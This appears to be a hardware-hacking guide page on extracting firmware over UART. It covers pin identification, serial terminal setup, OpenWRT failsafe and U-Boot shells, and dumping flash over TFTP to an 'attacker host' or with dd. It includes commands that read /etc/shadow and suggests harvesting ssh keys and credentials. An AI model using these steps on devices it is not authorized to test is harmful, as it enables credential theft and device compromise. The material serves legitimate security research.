# Extract Firmware using UART

After connecting to a UART connector on a PCB we can try to extract firmware over it.

### Steps to Extract Firmware Over UART

#### 1. **Identify UART Pins**

* Locate the UART pins (TX, RX, GND, and possibly VCC) on the target device. The device’s documentation or datasheet may provide this information.
* Typically, the pins are labeled as follows:
  * **TX** (Transmit) \[fluctuate Voltage, when data is transmitted]
  * **RX** (Receive) \[may look like VCC pin, when not connected: 3.3V]
  * **GND** (Ground) \[0V]
  * **VCC** (Power, optional) \[common to have: 3.3V or 5V]

#### 2. **Connect the UART Adapter**

* You need an **USB-to-UART Adapter**: FTDI FT232, CP2102, CH340, etc.
* Use jumper wires to connect the UART adapter to the target device as follows:
  * **TX (Adapter) → RX (Device)**
  * **RX (Adapter) → TX (Device)**
  * **GND (Adapter) → GND (Device)**
  * **VCC (Optional, Adapter) → VCC (Device)** (if powering the device through the adapter)

#### 3. **Configure Serial Terminal**

* Open your serial terminal software and configure the following settings:
  * **Baud Rate**: Common values are 9600, 115200, or as specified in the device’s documentation (picocom also has a feature to adjust the baud rate on the fly (check docs)).
  * **Data Bits**: 8
  * **Parity**: None
  * **Stop Bits**: 1
  * **Flow Control**: None

{% tabs %}
{% tab title="Linux" %}
```bash
sudo minicom -D /dev/ttyUSB0 -b 115200
sudo picocom -b 115200 -r -l /dev/ttyUSB0
```
{% endtab %}

{% tab title="Windows" %}
**Using PuTTY (Windows)**:

* Select “Serial” and enter the COM port (e.g., COM3) and baud rate (115200).
{% endtab %}
{% endtabs %}

#### 4. **Establish Connection**

* Open the connection in the serial terminal software. Depending on the device and its bootloader, there are many different options how the UART is implemented. It is a good sign if you see a terminal interface that may display boot messages or a command prompt from the target device.
*   If you see something like this: you may adjust the baud rate as it is probably wrong

    <figure><img src="../../../.gitbook/assets/image (54).png" alt=""><figcaption><p>False baud rate</p></figcaption></figure>
*   If you see a boot log:

    * Restart the device again and capture the full bootlog, as it can contain important information
    * The MTD partition for example can tell us where the root filesystem is stored

    <figure><img src="../../../.gitbook/assets/image (70).png" alt="" width="341"><figcaption><p>MTD partitions created</p></figcaption></figure>

#### Not all UART interfaces are the same. Infect manufacturers could output actually anything over it. But there are common methods, which we want to discuss further:

{% tabs %}
{% tab title="Failsafe mode" %}
Some manufacturers build a failsafe mode in their devices, which is designed as a recovery option, if the device is not operating correctly. An example for this is OpenWRT, which will print something like this in the bootlog:

```
Press the [f] key and hit [enter] to enter failsafe mode
Press the [1], [2], [3] or [4] key and hit [enter] to select the debug level  
```

Pressing `F`  will give us a root shell:

<figure><img src="../../../.gitbook/assets/image (32).png" alt=""><figcaption><p>OpenWrt command command shell</p></figcaption></figure>

From here we can check if the root-filesystem is already been mounted and we can look for:

* /etc/shadow hashes
* ssh private keys
* other credentials
{% endtab %}

{% tab title="U-Boot" %}
If U-Boot is used, chances are that the "stop autoboot" function may not be disabled. Here we have to press any key within a certain timespan (for example 5 sec) and we will be provided with a U-Boot shell

<figure><img src="../../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

Typing `help` will give us a list of all available commands

To dump the firmware, we can then use one of these options:

1. **Using TFTP:**
   1. On your attacker host:
      1. Set up a TFTP server `sudo apt install tftpd-hpa` (files will be stored in`/srv/tftp`)
      2. Create a firmware.bin file, as in TFTP that can't be done by the client:
         1. ```
            cd /srv/tftp
            sudo touch firmware.bin
            sudo chmod 666 firmware.bin
            ```
   2. In U-Boot:
      1. Setup IP-Adresses:
         1. ```
            setenv ipaddr <IP of target> (e.g.: 10.0.0.2)
            setenv serverip <IP of attacker host> (e.g.: 10.0.0.1)
            ```
      2. check if IP Adress are saved: `printenv`
   3. Initialize the flash with `sf probe 0`.
   4. Copy the flash contents to RAM (adjust offset and size):&#x20;
      1. `sf read <addr in RAM> <offset in flash> <size>`
      2. `sf read 0x82000000 0x0 0x1000000`. (=16MB in this case)
   5. Transfer the data with TFTP:&#x20;
      1. `tftp <addr> <filename> <size>`
      2. `tftp 0x82000000 firmware.bin 0x1000000`.
2. We can also dump it in the console: (CAN BE SLOW!)
   1. Read data:
      1. `md.b <offset to read from> <number of bytes to read>`
      2. example: `md.b 0x82000000 0x1000000`
   2. Save data to file using `CTRL-A L` in minicom for example (has to be trimmed)
3. If we want to dump from an MMC:
   1.  ```bash
       #list available MMCs
       mmc list
       # select an MMC to dump (we have to select one else next commands fail)
       mmc dev 0
       #get info of mmc
       mmc info
       # get partition to see which partition we wanna dump (e.g. rootfs)
       mmc part
       # search in partition
       ext4ls mmc <device>:<partition> <path>
       ext4ls mmc 1:8 /home/root
       # read file from MMC to RAM
       ext4load mmc <device>:<partition> <memory_address in ram> <file_path>
       ext4load mmc 1:8 0xC6200000 /etc/shadow
       # show the file from memory
       md.b <memory_address in ram> <size>
       md.b 0xC6200000 0x43C
       ```

       Tool that does these steps automatically: https://github.com/nmatt0/firmwaretools
{% endtab %}

{% tab title="Root-shell" %}
If you drop directly into a root shell or if you can figure out the root-password (e.g. default creds), you can simply `dd` the partition to a usb stick or transfer it another way.

Example:

```bash
sudo dd if=/dev/sda of=/dev/sdb bs=4M status=progress
```

Replace:

* `/dev/sda` with your root filesystem device
* `/dev/sdb` with your USB stick device

Ensure you verify the correct device paths to avoid overwriting important data. You can use `lsblk` or `fdisk -l` to check your devices.
{% endtab %}
{% endtabs %}

## Analyze firmware

* Using `binwalk firmware.bin` we can try to analyze the firmware and extract sensitive information
* check the "Analyze Firmware" chapter

## Resources

[https://www.cyberark.com/resources/threat-research-blog/accessing-and-dumping-firmware-through-uart](https://www.cyberark.com/resources/threat-research-blog/accessing-and-dumping-firmware-through-uart)\
[https://slava-moskvin.medium.com/extracting-firmware-every-method-explained-e94aa094d0dd](https://slava-moskvin.medium.com/extracting-firmware-every-method-explained-e94aa094d0dd)
